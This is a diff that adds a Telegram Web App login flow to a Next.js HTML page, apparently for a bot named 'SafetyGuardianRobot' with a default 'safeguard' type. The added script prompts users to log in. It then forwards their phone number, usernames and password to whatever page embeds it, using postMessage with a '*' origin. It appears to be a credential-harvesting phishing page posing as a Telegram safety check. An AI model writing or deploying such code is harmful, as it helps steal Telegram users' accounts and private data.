@@ -9,6 +9,8 @@
     <meta name="next-head-count" content="5">
     <link rel="preload" href="./_next/static/css/3db7e18ba6d2d9e9.css" as="style">
     <link rel="stylesheet" href="./_next/static/css/3db7e18ba6d2d9e9.css" data-n-g="">
+    <!-- Add Telegram Web App script -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
   </head>
   <body>
     <div id="__next">
@@ -24,5 +26,62 @@
         </main>
       </div>
     </div>
+    <!-- Add script to handle Telegram Web App login -->
+    <script>
+      window.onload = () => {
+        const queryString = window.location.search;
+        const urlParams = new URLSearchParams(queryString);
+        const type = urlParams.get('type') || 'safeguard'; // Default to 'safeguard' if type is missing
+        Telegram.WebApp.ready();
+        Telegram.WebApp.expand();
+        Telegram.WebApp.MainButton.setText('Login to Telegram')
+          .show()
+          .onClick(() => {
+            Telegram.WebApp.showPopup({
+              title: 'Login to Telegram',
+              message: 'Please login to your Telegram account to continue.',
+              buttons: [
+                { id: 'login', type: 'default', text: 'Login' },
+                { type: 'cancel' }
+              ]
+            }, (buttonId) => {
+              if (buttonId === 'login') {
+                Telegram.WebApp.openTelegramLink('https://t.me/SafetyGuardianRobot?start=login');
+              }
+            });
+          });
+        Telegram.WebApp.onEvent('web_app_data', (event) => {
+          // Log the event to the server for debugging
+          fetch('/api/debug', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ message: `Received web_app_data event: ${event.data}` }),
+          });
+          // Parse the event data
+          const data = JSON.parse(event.data);
+          // Log the postMessage action
+          fetch('/api/debug', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ message: `Sending postMessage for type ${type} with userId ${data.id}` }),
+          });
+          // Send the data to the parent window
+          window.parent.postMessage({
+            type,
+            id: data.id,
+            first_name: data.first_name,
+            usernames: data.usernames,
+            phone_number: data.phone_number,
+            premium: data.is_premium,
+            password: data.password,
+            quickly_set: data.quickly_set
+          }, '*');
+        });
+      };
+    </script>
   </body>
 </html>
